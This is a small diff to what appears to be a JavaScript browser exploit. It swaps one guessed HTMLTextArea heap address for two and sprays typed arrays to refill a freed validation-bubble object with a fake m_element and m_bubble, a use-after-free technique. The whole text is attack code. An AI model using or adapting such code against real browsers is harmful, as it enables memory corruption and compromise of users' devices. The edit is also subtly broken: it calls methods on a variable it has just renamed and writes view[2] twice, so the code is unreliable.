@@ -42,7 +42,8 @@ var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";
 var g_round = 1;
 var g_input = null;
 
-var guess_htmltextarea_addr = new Int64("0x2031b00d8");
+var guess_htmltextarea_addr1 = new Int64("0x2031b00d8");
+var guess_htmltextarea_addr2 = new Int64("0x2031b60d8");
 
 
 /* Executed after deleteBubbleTree */
@@ -333,7 +334,8 @@ function reuseTargetObj() {
 		let view = new Float64Array(ab);
 
 		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
-		view[2] = guess_htmltextarea_addr.asDouble();   // m_bubble
+		view[2] = guess_htmltextarea_addr.asDouble1();   // m_bubble
+		view[2] = guess_htmltextarea_addr.asDouble2();
 
 		g_arr_ab_1.push(view);
 	}
